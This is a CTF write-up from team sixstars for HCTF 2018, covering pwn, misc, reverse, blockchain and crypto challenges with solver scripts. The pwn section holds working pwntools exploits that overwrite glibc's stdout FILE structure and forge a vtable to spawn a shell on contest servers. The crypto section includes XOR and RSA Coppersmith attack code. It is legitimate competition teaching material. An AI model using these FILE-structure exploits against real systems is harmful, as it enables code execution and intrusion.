# hctf 2018 writeup

team: sixstars

## pwn

### the_end
fsop
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
code = ELF('./the_end')

def pp(addr, byte):
    r.send(p64(addr))
    r.send(byte)

r = remote(args['HOST'], args['PORT'])
r.sendlineafter(':', 'YCMcAG60fpTxa0MUv5xwLQ6sEIYjS3tJ')
r.recvuntil('here is a gift ')
tmp = r.recvuntil(',', drop=True)
r.recvline()
libc.address = int(tmp, 16) - libc.sym['sleep']
info('%016x libc.address', libc.address)

pp(libc.sym['_IO_2_1_stdout_']+40, '\xff')
pp(libc.sym['_IO_2_1_stdout_']+0xd8+1, p64(libc.address+0x3c44e0)[1])
pp(libc.address + 0x3c44e0+0x18, p64(libc.address+0xf02a4)[0])
pp(libc.address + 0x3c44e0+0x18+1, p64(libc.address+0xf02a4)[1])
pp(libc.address + 0x3c44e0+0x18+2, p64(libc.address+0xf02a4)[2])

r.interactive()

```

### babyprintf
泄露libc，改stdout
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./babyprintf_ver2"
elf=ELF(pwn_file)
libc = ELF("./bc.so.6")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("150.109.46.159",20005)
    r.sendlineafter("token:","YCMcAG60fpTxa0MUv5xwLQ6sEIYjS3tJ")
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def leak(payload,ends = None):
    r.sendline(payload)
    if ends == None:
        return r.recv()
    else:
        return r.recvuntil(ends)

r.recvuntil("location to ")
elf.address=int(r.recvline(),16)-0x202010
r.recvuntil("Have fun!\n")
base=0x202010+elf.address
jmp_table=0x202130+elf.address
stdout=base+0x30
flag=0xfbad3c80

def file_ptr(flag=0,read_ptr=0,read_end=0,read_base=0,write_base=0,write_ptr=0,write_end=0,buf_base=0,buf_end=0):
    return p64(flag)+p64(read_ptr)+p64(read_end)+p64(read_base)+\
            p64(write_base)+p64(write_ptr)+p64(write_end)+\
            p64(buf_base)+p64(buf_end)

payload = file_ptr(flag=flag,write_base = stdout, write_ptr = stdout +0xe0,write_end = stdout + 0xe0).ljust(0x70,"\x00")+p64(1)+p64(0xffffffffffffffff)+p64(0x0000000000000000)+p64(0x202640+elf.address)
f={
    0:"a".ljust(0x10,"\x00")+p64(stdout),
    stdout - base : payload
}
libc.address = u64(leak(fit(f,filler="\x00"),ends = "\x7f")[-6:].ljust(8,"\x00"))-0x3ac2a0 - 0x3c000
def pack_file(_flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0):
    struct = p32(_flags) + \
    p32(0) + \
    p64(_IO_read_ptr) + \
    p64(_IO_read_end) + \
    p64(_IO_read_base) + \
    p64(_IO_write_base) + \
    p64(_IO_write_ptr) + \
    p64(_IO_write_end) + \
    p64(_IO_buf_base) + \
    p64(_IO_buf_end) + \
    p64(_IO_save_base) + \
    p64(_IO_backup_base) + \
    p64(_IO_save_end) + \
    p64(_IO_marker) + \
    p64(_IO_chain) + \
    p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct
fake_vtable_addr = libc.address + 0x3e8360 - 0x20
#fake_vtable_addr = libc.sym["_IO_str_jumps"] - 0x20
f={
    0:p64(fake_vtable_addr),
    0x10:p64(stdout),
    stdout-base : pack_file(_flags = flag,
        _IO_write_base = stdout + 0xd8,
        _IO_write_ptr = stdout + 0xd8,
        _IO_write_end = stdout + 0xd8+0x20,
        _fileno = 1,
        _lock = elf.address + 0x202a60
        )
}

leak(fit(f,filler="\x00"))

rdi = next(libc.search("/bin/sh"))

file_struct = pack_file(
_flags = flag,
_IO_buf_end = (rdi-100)/2,
_IO_write_ptr = (rdi-100)/2,
_IO_write_base = 0,
_lock = elf.address+0x202640,
    ) + p64(fake_vtable_addr)+ p64(libc.sym["system"])

f={
    0:"a"*0x10+p64(stdout),
    stdout-base:file_struct
}
leak(fit(f,filler="\x00"))
r.interactive()
```
## MISC
### freqgame
傅立叶变换求出频率
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import numpy as np
import scipy.signal as signal

if len(sys.argv) == 1:
    r=remote("127.1",20001)
else:
    r=remote("150.109.119.46",6775)
    r.sendlineafter("hint:","y")
    r.sendlineafter("token:","YCMcAG60fpTxa0MUv5xwLQ6sEIYjS3tJ")

for i in range(8):
    r.recvuntil("[")
    data=r.recvuntil("]")[:-1].split(", ")
    x=np.array(map(float,data))
    sampling_rate = 1500
    fft_size = 1500
    xs = x[:fft_size]
    xf = np.fft.rfft(xs)/fft_size
    freqs = np.linspace(0, sampling_rate/2, fft_size/2+1)
    xfp = 20*np.log10(np.clip(np.abs(xf), 1e-20, 1e100))
    fq = signal.argrelextrema(xfp,np.greater)[0]
    payload = " ".join(map(str,fq))
    print payload
    r.sendline(payload)

r.interactive()
```
### Guess my key
题目发现，同一个明文无论密钥如何密文都一样，只有raw_cipher不一样，所以通过测试发现这个可能是一串行向量，通过梯度下降的方法，每次只改变一个方向的0或者1，尝试96次选取欧氏距离与目标最短的那一次，并且记录这次到备忘录，防止成环，然后就可以发现距离不断缩小，最后变成零。
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 zzj <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

"""

"""
import numpy as np
import requests

def del_text(text):
    begin = text.find(r'"raw_cipher": "')+15
    end = text.find(r'", "err_msg')
    newtext =  text[begin:end]
    # print newtext
    x = newtext.split(',')
    y =[]
    for i in x:
        y.append(float(str(i)))
    return y

url = 'http://150.109.62.46:13577/enc'

key1 = '0,1,0,0,0,1,1,0,0,1,1,1,0,0,1,1,0,0,0,1,0,0,1,1,0,1,0,1,0,0,0,1,0,1,0,1,1,1,0,0,0,1,1,1,0,0,0,1,0,1,1,0,0,0,0,1,0,1,0,1,1,0,1,0,0,1,1,0,1,1,1,0,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,0,1,0,0,0,1,1,1'
# lastkey = '0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1'
lastkey = []
lastkey.append(key1)
count = 0
while True:
    temp = []
    params={
            'key':'',
            'msg':'1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1'
                }
    req = requests.get(url, params=params)
    vector0 = np.array(del_text(req.text))
    temp.append(vector0)
    # key1 = '0,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,0,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,0,1'
    # key1 = '0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1'
    # lastkey = '0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1'
    # key1 = '0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1'
    key_1 = key1.replace(',','')
    params['key'] = key1
    req = requests.get(url, params=params)
    vector0 = np.array(del_text(req.text))
    temp.append(vector0)
    min_num = 9999
    min_key = ''
    # max_temp = []
    for i in range(96):
        key2 = ''
        if key_1[:i]+'0'+key_1[i+1:] != key_1:
            key_2 = key_1[:i]+'0'+key_1[i+1:]
        else:
            key_2 = key_1[:i]+'1'+key_1[i+1:]
        for i in key_2:
            key2 += i
            key2 += ','
        key2 = key2[:-1]
        params['key'] = key2
        if key2 in lastkey:
            continue
        req = requests.get(url, params=params)
        vector1 = np.array(del_text(req.text))
        temp.append(vector1)
        if np.linalg.norm(temp[-1]-temp[0])< min_num:
            min_temp = temp[-1]
            min_num = np.linalg.norm(temp[-1]-temp[0])
            min_key = key2
            lastkey.append(key2)
    count+=1
    print '[ ]the count is :'
    print '[+]the vector in temp is :'
    print min_temp
    print '[+]the next_key is :'+min_key
    print '[+]the min_d is :'+str(min_num)
    
    if count > 96*96 or min_num == 0:
        print '[*]the key is :'+key1
        print '[*]the min_num is :'+str(min_num)
        break
    key1 = min_key
#http://150.109.62.46:13577/enc?msg=1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&key=0,1,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,1,0,1,0,0,0,0,0,1,0,0,1,1,0,0,0,1,1,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,0,1,0,0,1,1,0,1,1,1,0,0,0,1,0,0,0,0,1,0,1,1,0,1,1,1,0,0,1,0,0,0,1,1,1

# 0,1,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,1,0,1,0,0,0,0,0,1,0,0,1,1,0,0,0,1,1,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,0,1,0,0,1,1,0,1,1,1,0,0,0,1,0,0,0,0,1,0,1,1,0,1,1,1,0,0,1,0,0,0,1,1,1


#http://150.109.62.46:13577/enc?msg=1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1




```

## Reverse
### luckyStar
题目加了很多反调和代码混淆，弄清楚逻辑后，首先合理patch 程序，令其将随机数全打印出来，然后利用随机数重新patch程序，得到正常的程序逻辑。
要求输入一段字符串，程序对其进行类base64编码，然后字符串的每两个bite和随机数进行异或，输出和指定字符串进行比较。

```python
t1="DEF0A07232EEBC954C11473ABD57E649".decode("hex")[::-1]
t2="05CCC8CA3C67C5A6A96E49835683F2AC".decode("hex")[::-1]
s=map(ord,t1+t2)

array = [7000,22058,9462,8438,313,31579,13607,25688,373,10432,31469,8295,16228,18912,29442,24839,20778,12002,13637,1451,25401,12797,21596,12910,13591,20783,24733,22368,21346,4146,4655,16925,13073,13996,24172,28069,4604,16038,31882,1127,16543,1855,7547,18591,14618,8097,23313,22242,10109,15925,8806,30455,18243,14355,7547,28393,14876,3261,24607,3162,15344,23052,23571,22554,22560,19562,24683,10233,1039,24386,10295,729,17121,437,15459,2823,13954,29583,11484,25291,16874,28281,25844,16189,8352,28528,7944,7515,6013,13429,15200,19801,8883,17030,32342,18488,17678,1998,31163,922,23673,28185,9590,14293,8131,29066,27502,19526,10659,3984,10923,24040,13562,8726,30136,5156,28249,31482,4171,14315,32451,21441,28711,16643,13236,25993,17730,19870,26721,15678,19747,14385,5186,8209,30095,16259,8910,5158,4708,29957,30854,24973,10949,25953,18740,8052,8567,12117,9077,8603,15499,31938,21877,23048,20542,4608,3834,763,4381,26485,25764,9508,20845,358,6259,19988,11721,31244,19337,2802,27917,29163,32049,31599,6003,23135,31521,4347,2300,20088,9980,20026,786,28167,13595,6833,363,28409,18573,32454,22064,22756,4188,23527,20831,7904,18962,29961,30574,2968,19836,23380,2865,13217,1454,4892,28413,25098,31559,1300,8462,13108,21495,4030,22310,20963,27454,19750,32119,2710,26742,24784,7363,10516,30227,25071,27586,21576,32298,13783,4036,23630,4144,28341,20631,11982,21509,638,17323,25993,11824,28197,12916,9009,31085,6417,16400,12926,31077,3278,4650,7038,27324,21763,286,9005,21584,7076,4957,26949,32192,21864,18452,6231,12076,4734,29960,23579,7740,18300,15300,4613,11364,8856,23031,26648,23142,16666,22808,24063,5400,22801,24907,23642,16231,11077,13192,22102,7580,20846,3834,10624,1502,15523,1445,12251,31224,30741,1100,14383,3677,1021,4498,22693,17001,23763,2143,20369,11754,705,20869,26255,10207,5463,24740,3025,19072,22400,30795,5559,30846,12213,31071,25760,18315,30832,16833,22273,29725,13540,24107,17332,17007,32235,4955,28306,28873,15168,628,11075,7938,31982,27809,8789,20291,2312,23035,27788,25613,29083,10157,30841,16254,18145,16725,28238,26576,14775,2478,1521,21794,16977,13933,847,19579,7981,9064,19699,27660,16453,24829,20695,19637,29321,434,11130,23755,24460,27417,17714,22553,13694,11767,22980,292,2906,10660,7730,32692,21856,32437,30932,2191,32198,5337,32682,12936,30123,14337,12529,7352,21068,4292,6644,18956,19066,31745,24613,22016,10316,1478,24684,26281,785,2928,22719,32761,21896,18708,20467,7231,17492,22046,12242,11757,10410,21816,17773,28318,13133,23406,7092,8023,15292,21135,25667,7693,4009,23254,25215,29800,22190,28617,3298,17351,24124,21602,22675,12932,25044,2669,25402,15993,9081,22833,28434,6339,26725,10066,25920,28357,11771,11254,21091,17520,11005,15143,4460,17346,28927,12665,6320,9613,16923,17132,7483,6010,28391,12563,103,17229,20644,11382,15278,23403,13240,25910,16061,20633,18015,3823,29641,5382,24477,23522,24102,4236,12919,13140,1814,10803,16738,10033,11487,2807,9724,27893,26656,32203,250,24012,15204,4317,9825]
array = array[383:]
pc = 0

for i in range(len(s)):
	s[i] ^= ((array[pc]%4)<<6)&0xff
	pc+=1
	s[i] ^= ((array[pc]%4)<<4)&0xff
	pc+=1
	s[i] ^= ((array[pc]%4)<<2)&0xff
	pc+=1
	s[i] ^= (array[pc]%4)&0xff
	pc+=1

print "".join(map(chr,s))
```

## Blockchain
### ez2win
照着链上别人的交易，调了一个`_transfer`函数拿到flag

## Crypto
### xor game
题目给的题型类似于muti byte xor 的流密码，密钥重复，首先确定密钥长度，发现长度为21，然后根据长度分组，确定每一组最可能出现的字符为空格，不断尝试就可以求出来flag多的不说直接上代码
```python
from encrypted import enc_numbers,enc_ascii
from collections import Counter

def shift(data, offset):
    return data[offset:] + data[:offset]

def count_same(a, b):
    count = 0
    for x, y in zip(a, b):
        if x == y:
            count += 1
    return count

# print ('key lengths')
# for key_len in range(1, 100): # try multiple key lengths
#     freq = count_same(enc_numbers, shift(enc_numbers, key_len))

#     print ('{0:< 3d} | {1:3d} |'.format(key_len, freq) + '=' * (freq / 4))
    # ^ this line does fancy formatting that outputs key_len and then freq and
    # then a bar graph
key_len = 21

frequencies = []
for i in range(0, key_len):
    frequency = Counter()
    for ch in enc_ascii[i::key_len]:
        frequency[ch] += 1
    frequencies.append(frequency)

print ('guesses for most common letters')
print frequencies
for frequency in frequencies:
    # print 'frequency.most_common(1)'
    # print frequency.most_common(1)
    print 'frequency.most_common(10)'
    print frequency.most_common(10)
key_numbers = []
for frequency in frequencies:
    k = ord(frequency.most_common(1)[0][0]) ^ ord(' ')
    print ('{k} -> \' \''.format(**locals()))
    key_numbers.append(k)

    others = ''
    for val, freq in frequency.most_common(10):
        others += chr(ord(val) ^ k) + ' '
    print ('Other common letters: {others}\n'.format(**locals()))


key_numbers[0] = ord(frequencies[0].most_common(10)[1][0]) ^ ord(' ')
key_numbers[2] = ord(frequencies[2].most_common(10)[1][0]) ^ ord(' ')
key_numbers[3] = ord(frequencies[3].most_common(10)[1][0]) ^ ord(' ')
key_numbers[5] = ord(frequencies[5].most_common(10)[3][0]) ^ ord(' ')
key_numbers[8] = ord(frequencies[8].most_common(10)[1][0]) ^ ord(' ')
key_numbers[11] = ord(frequencies[11].most_common(10)[3][0]) ^ ord(' ')
key_numbers[14] = ord(frequencies[14].most_common(10)[3][0]) ^ ord(' ')
for i,frequency in enumerate(frequencies):
    k = key_numbers[i]

    others = ''
    print 'the key num:'+str(i)
    for val, freq in frequency.most_common(10):
        others += chr(ord(val) ^ k) + ' '
    print ('Other common letters: {others}\n'.format(**locals()))
flag = ''
for i in key_numbers:
    flag+=chr(i)
print 'flag is '+ 'hctf{'+flag+'}'

from itertools import izip, cycle
from encrypted import enc_numbers

def decrypt(c_num, k_num):
    return ''.join(chr(c ^ k) for c, k in izip(c_num, cycle(k_num)))

print ('decrypting text')
print (decrypt(enc_numbers, key_numbers))
```

### xor?rsa

题目就是rsa的Coppersmith’s short-pad attack 和Franklin-Reiter related-message attack，详细见wiki百科，多的不说直接上代码
```python


def short_pad_attack(c1,c2,e,n):
    PRxy.<x,y> = PolynomialRing(Zmod(n))
    PRx.<xn> = PolynomialRing(Zmod(n))
    PRZZ.<xz,yz> = PolynomialRing(Zmod(n))

    g1 = x^e - c1
    g2 = (x+y)^e - c2

    q1 = g1.change_ring(PRZZ)
    q2 = g2.change_ring(PRZZ)

    h = q2.resultant(q1)
    h = h.univariate_polynomial()
    h = h.change_ring(PRx).subs(y=xn)
    h = h.monic()

    kbits = n.nbits()//(2*e*e)
    diff = h.small_roots(X=2^kbits, beta=0.5)[0]

    return diff

def related_message_attack(c1, c2, diff, e, n):
    PRx.<x> = PolynomialRing(Zmod(n))
    g1 = x^e - c1
    g2 = (x+diff)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()

    return -gcd(g1, g2)[0]


if __name__ == '__main__':
    n = 23154493859480233148471290261591641646319640083772356600731028787656143050879409295051782069996422190234660178066700333370475640721756085248738791958798320441182479985478620550343541793538478061399985083546000590219116232579639034779077306207287286331755925437515039266023277208375114602026112268783617886951605757792896207983087997578141116832301960762541119278630110154776919208555192271847022185531722341058443139705320945802662414779832702048985414993502673917922092229634200891244852829961103392325976358801833310044143212825654909892155922734609298645547253493133358912428468069710788308985597946157905716894777
    e = 5

    c1 = 21924588245188932844002425458663333660439791185950534146804445688891366744514909672301285778862015812850740281060742497792131222159098452529528504614188540576699666734542899389677247833772178697317150676965563297087445224251200780331244143323818734081441840071762506877786604420618390778300116464160384003077366840811472164551072574499801031030497956874860502452801373790890515876626725234742131371677187692355988027436592152027448039775782396160883124251945194139993091772553405623999324242069508841732522767332287989400553620019369327793538861128398263709107151694890857497073307884362919633178042164187786826775442
    c2 = 373676693328286919127295518634154924173359194940986593526020345967871990363530741364829513667060826209241789336832950237858281094207532065246443574020591911143710001808897664996253283567544246280937139293538688130519321179137973356097325419164450979736037083825464095511597616560265929077823234067916279183112918252383779972572734452654061089003427820388668912006239092111498681634625938090100037221837555188983742614694249337125406810347791808951198490631422976225651607905006007885957741222161280301040872681855204251364612909228999984073988405957339885630525959965682544843647547061902079909955325238213500213767


    diff = short_pad_attack(c1, c2, e, n)
    #print "difference of two messages is %d" % diff

    m1 = related_message_attack(c1, c2, diff, e, n)
    print m1
    print m1+diff
```
